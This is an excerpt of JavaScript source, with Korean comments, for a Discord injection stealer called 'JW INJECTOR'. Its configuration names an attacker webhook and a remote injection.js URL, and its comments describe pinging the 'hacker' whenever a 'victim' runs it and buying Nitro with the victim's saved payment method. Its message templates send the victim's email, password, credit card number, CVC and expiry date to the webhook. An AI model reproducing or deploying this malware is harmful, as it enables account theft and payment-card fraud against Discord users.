...
const config = {
  webhook: '%WEBHOOK%', // 웹훅을 넣을 코드 부분
  webhook_protector_key: '%WEBHOOK_KEY%', // 웹훅 스패밍 방지 키
  auto_buy_nitro: false, // 피해자의 계정으로 결제수단이 등록되있는 경우 니트로를 구매함.
  ping_on_run: true, // 피해자가 실행시킬때마다 해커의 웹훅으로 알림 보냄
  ping_val: '@everyone', // 핑 설정
  embed_name: 'JW INJECTOR', // 인젝터 이름
  embed_icon: 'https://url.kr/o47yl5'.replace(/ /g, '%20'), // 이미지 링크
  embed_color: 5639644, // 임베드 (헥스코드) (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
  injection_url: 'https://raw.githubusercontent.com/Lier0102/injection/main/injection.js', // re인젝션 
  // 이미 시중에 디스코드가 electron을 사용함으로써 발생하는 취약점에 대해 자세히 서술되어 있다.
  // CVE...
  /**
   * @ATTENTION 전문가가 아님 건들지 마셈 @ATTENTION
   **/
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**계정 정보**',
            value: `이메일: **${email}** - Password: **${password}**`,
            inline: false,
          },
          {
            name: '**디스코드 정보**',
        ...
        footer: {
          text: '🎉・Discord Injection By Lier0102 Github ・https://github.com/Lier0102/injection',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**신용카드 추가 감지됨**',
            value: `신용카드 번호: **${number}**\nCVC: **${cvc}**\n신용카드 만료일: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**디스코드 정보**',
